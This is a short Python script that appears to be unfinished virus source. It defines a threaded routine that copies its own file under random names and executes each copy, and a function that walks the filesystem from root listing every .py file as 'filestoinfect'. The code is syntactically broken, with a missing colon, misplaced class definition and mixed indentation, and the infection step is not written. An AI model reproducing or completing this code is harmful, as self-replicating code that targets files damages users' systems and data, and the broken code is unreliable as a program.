import os
import inspect
from shutil import *
from random import *
import threading
var = 0
var1 = 16
path = "/"
def multi(var1)
	for i in range(0,var1):
		MyThread().start()
		i += 1
		class MyThread(threading.Thread):
		def run(self):
			global var
			var += 1
			for i in range(0,4):
				name1 = str(randint(1,1000000000000000))
				newFile = "%s.py" % name1
				dir1 = str(inspect.getfile(inspect.currentframe()))
				dir2 = str(os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe()))))
				copy("%s" % (dir1), "%s/%s" % (dir2, newFile))
				newDirec = "%s/%s" % (dir2, newFile)
				cmd = "python %s" % newDirec
				os.system(cmd)
	
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
		elif fname[-3:] == ".py":
            for line in open(path+"/"+fname):
                    break
            if 1 == 1:
				#print (path+"/")
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
	
search(path)